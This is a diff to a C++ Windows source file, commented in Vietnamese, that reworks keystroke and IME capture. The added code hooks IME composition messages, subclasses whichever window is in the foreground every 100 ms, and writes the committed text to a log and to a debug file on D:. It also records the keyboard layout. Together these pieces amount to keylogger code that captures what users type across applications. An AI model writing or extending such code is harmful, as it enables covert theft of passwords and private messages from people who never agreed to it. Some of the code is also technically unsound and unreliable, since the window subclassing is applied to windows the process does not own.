@@ -1,5 +1,5 @@
-﻿#include "../multilanguage.h"
-#include "../utils.h"
+﻿#include "multilanguage.h"
+#include "utils.h"
 #include <imm.h>
 
 #pragma comment(lib, "imm32.lib")
@@ -7,6 +7,9 @@
 // Biến toàn cục để lưu trữ thông tin ngôn ngữ
 LanguageInfo g_currentLanguage = { 0 };
 HHOOK g_imeHook = NULL;
+
+HWND g_foregroundWindow = NULL;
+WNDPROC g_oldWndProc = NULL;
 
 // Danh sách thông báo cần theo dõi cho IME
 const UINT IME_MESSAGES[] = {
@@ -161,7 +164,9 @@ std::wstring ExtractUnicodeCharFromKey(WPARAM virtualKey, BYTE keyState[256]) {
     wchar_t buffer[5] = { 0 };
     UINT scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);
 
-    // Chuyển đổi mã phím thành ký tự Unicode
+    HKL currentLayout = GetKeyboardLayout(0);
+
+    // Chuyển đổi mã phím thành ký tự Unicode với keyboard layout hiện tại
     int result = ToUnicodeEx(
         virtualKey,
         scanCode,
@@ -169,7 +174,7 @@ std::wstring ExtractUnicodeCharFromKey(WPARAM virtualKey, BYTE keyState[256]) {
         buffer,
         sizeof(buffer) / sizeof(buffer[0]) - 1,
         0,
-        g_currentLanguage.keyboardLayout
+        currentLayout  // Sử dụng layout hiện tại thay vì g_currentLanguage.keyboardLayout
     );
 
     if (result > 0) {
@@ -184,74 +189,91 @@ LRESULT CALLBACK ImeHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
         return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
 
-    // Cập nhật thông tin IME
-    UpdateImeStatus();
-
-    CWPSTRUCT* cwp = (CWPSTRUCT*)lParam;
+    MSG* msg = (MSG*)lParam;
 
     // Xử lý các thông báo IME
-    if (cwp) {
-        for (int i = 0; i < sizeof(IME_MESSAGES) / sizeof(IME_MESSAGES[0]); i++) {
-            if (cwp->message == IME_MESSAGES[i]) {
-                // Lấy HIMC từ cửa sổ hiện tại
-                HWND hWnd = cwp->hwnd;
-                HIMC hImc = ImmGetContext(hWnd);
+    if (msg && msg->message == WM_IME_COMPOSITION && (msg->lParam & GCS_RESULTSTR)) {
+        HIMC hImc = ImmGetContext(msg->hwnd);
+        if (hImc) {
+            DWORD bufLen = ImmGetCompositionStringW(hImc, GCS_RESULTSTR, NULL, 0);
+            if (bufLen > 0) {
+                std::vector<wchar_t> buffer(bufLen / sizeof(wchar_t) + 1, 0);
+                ImmGetCompositionStringW(hImc, GCS_RESULTSTR, buffer.data(), bufLen);
 
-                if (hImc) {
-                    switch (cwp->message) {
-                    case WM_IME_STARTCOMPOSITION:
-                        g_currentLanguage.isComposing = true;
-                        g_currentLanguage.currentComposition.clear();
-                        break;
+                // Ghi kết quả tiếng Trung
+                std::wstring resultStr(buffer.data());
+                WriteUnicode(resultStr);
 
-                    case WM_IME_ENDCOMPOSITION:
-                        g_currentLanguage.isComposing = false;
-                        g_currentLanguage.currentComposition.clear();
-                        break;
-
-                    case WM_IME_COMPOSITION:
-                        if (cwp->lParam & GCS_RESULTSTR) {
-                            // Có kết quả chuỗi hoàn chỉnh
-                            DWORD bufLen = ImmGetCompositionStringW(hImc, GCS_RESULTSTR, NULL, 0);
-
-                            if (bufLen > 0) {
-                                std::vector<wchar_t> buffer(bufLen / sizeof(wchar_t) + 1, 0);
-                                ImmGetCompositionStringW(hImc, GCS_RESULTSTR, buffer.data(), bufLen);
-
-                                // Ghi kết quả vào log
-                                std::wstring resultStr(buffer.data());
-                                WriteUnicode(resultStr);
-                            }
-                        }
-                        else if (cwp->lParam & GCS_COMPSTR) {
-                            // Chuỗi đang soạn thảo
-                            DWORD bufLen = ImmGetCompositionStringW(hImc, GCS_COMPSTR, NULL, 0);
-
-                            if (bufLen > 0) {
-                                std::vector<wchar_t> buffer(bufLen / sizeof(wchar_t) + 1, 0);
-                                ImmGetCompositionStringW(hImc, GCS_COMPSTR, buffer.data(), bufLen);
-
-                                g_currentLanguage.currentComposition = std::wstring(buffer.data());
-                            }
-                        }
-                        break;
-
-                    case WM_IME_CHAR:
-                        // Ký tự IME
-                    {
-                        wchar_t wc = (wchar_t)cwp->wParam;
-                        WriteUnicode(std::wstring(1, wc));
-                    }
-                    break;
-                    }
-
-                    ImmReleaseContext(hWnd, hImc);
+                // Debug để xác nhận
+                FILE* f = nullptr;
+                errno_t err = fopen_s(&f, "D:\\ime_result.txt", "a");
+                if (err == 0 && f != nullptr) {
+                    fprintf(f, "IME Result: %ls\n", resultStr.c_str());
+                    fclose(f);
                 }
-
-                break;
             }
+            ImmReleaseContext(msg->hwnd, hImc);
         }
     }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+void LogCurrentLanguage() {
+    HKL layout = GetKeyboardLayout(0);
+    char layoutName[KL_NAMELENGTH];
+
+    if (GetKeyboardLayoutNameA(layoutName)) {
+        std::string msg = "\n[KEYBOARD LAYOUT: ";
+        msg += layoutName;
+        msg += "]\n";
+        Write(msg);
+    }
+}
+
+LRESULT CALLBACK IMEWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    if (msg == WM_IME_COMPOSITION && (lParam & GCS_RESULTSTR)) {
+        HIMC hImc = ImmGetContext(hWnd);
+        if (hImc) {
+            DWORD len = ImmGetCompositionStringW(hImc, GCS_RESULTSTR, NULL, 0);
+            if (len > 0) {
+                wchar_t* buffer = new wchar_t[len / 2 + 1];
+                ImmGetCompositionStringW(hImc, GCS_RESULTSTR, buffer, len);
+                buffer[len / 2] = 0;
+
+                // Ghi kết quả tiếng Trung
+                WriteUnicode(std::wstring(buffer));
+
+                delete[] buffer;
+            }
+            ImmReleaseContext(hWnd, hImc);
+        }
+    }
+
+    return CallWindowProc(g_oldWndProc, hWnd, msg, wParam, lParam);
+}
+
+// Hàm theo dõi cửa sổ và thiết lập hook
+void MonitorActiveWindow() {
+    while (true) {
+        HWND currentWindow = GetForegroundWindow();
+
+        if (currentWindow != g_foregroundWindow) {
+            // Bỏ hook cửa sổ cũ
+            if (g_foregroundWindow && g_oldWndProc) {
+                SetWindowLongPtr(g_foregroundWindow, GWLP_WNDPROC, (LONG_PTR)g_oldWndProc);
+                g_oldWndProc = NULL;
+            }
+
+            // Hook cửa sổ mới
+            g_foregroundWindow = currentWindow;
+            if (g_foregroundWindow) {
+                g_oldWndProc = (WNDPROC)SetWindowLongPtr(g_foregroundWindow,
+                    GWLP_WNDPROC,
+                    (LONG_PTR)IMEWndProc);
+            }
+        }
+
+        Sleep(100); // Kiểm tra mỗi 100ms
+    }
 }
